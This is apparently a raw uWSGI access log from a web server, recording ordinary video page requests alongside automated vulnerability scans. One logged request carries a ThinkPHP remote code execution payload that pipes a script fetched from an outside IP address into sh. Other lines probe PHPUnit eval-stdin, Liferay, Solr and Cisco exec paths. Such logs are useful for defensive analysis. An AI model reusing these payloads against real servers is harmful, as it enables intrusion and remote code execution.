[1615219201] ./uwsgi.log reopened.
[pid: 233988|app: 0|req: 2158/4771] 124.70.90.123 () {36 vars in 553 bytes} [Tue Mar  9 15:50:22 2021] GET /wp-login.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233989|app: 0|req: 1023/4772] 124.70.90.123 () {36 vars in 529 bytes} [Tue Mar  9 15:50:22 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233989|app: 0|req: 1024/4773] 124.70.90.123 () {36 vars in 832 bytes} [Tue Mar  9 15:50:22 2021] GET /?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl+--user-agent+curl_tp5+http://194.40.243.98/ldr.sh|sh => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233989|app: 0|req: 1025/4774] 218.13.14.204 () {42 vars in 814 bytes} [Tue Mar  9 16:16:59 2021] GET /video/play/102991/2-28.html => generated 23427 bytes in 10 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 233990|app: 0|req: 788/4775] 112.96.180.122 () {42 vars in 814 bytes} [Tue Mar  9 19:13:20 2021] GET /video/play/102991/2-28.html => generated 23427 bytes in 10 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 2159/4776] 112.96.180.122 () {44 vars in 879 bytes} [Tue Mar  9 19:13:28 2021] GET /video/play/102991/2-29.html => generated 23427 bytes in 10 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 2160/4777] 89.248.165.180 () {34 vars in 455 bytes} [Tue Mar  9 19:57:49 2021] GET /level/15/exec/-/sh/run/CR => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 2161/4778] 112.96.180.122 () {42 vars in 814 bytes} [Tue Mar  9 20:02:07 2021] GET /video/play/102991/2-29.html => generated 23427 bytes in 10 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 2162/4779] 74.82.47.3 () {28 vars in 306 bytes} [Tue Mar  9 20:20:42 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 2163/4780] 128.14.134.134 () {34 vars in 490 bytes} [Tue Mar  9 20:26:51 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 2164/4781] 45.155.205.225 () {38 vars in 714 bytes} [Tue Mar  9 20:37:54 2021] POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233989|app: 0|req: 1026/4782] 45.155.205.225 () {38 vars in 612 bytes} [Tue Mar  9 20:37:54 2021] POST /api/jsonws/invoke => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233989|app: 0|req: 1027/4783] 45.155.205.225 () {34 vars in 558 bytes} [Tue Mar  9 20:37:55 2021] GET /solr/admin/info/system?wt=json => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
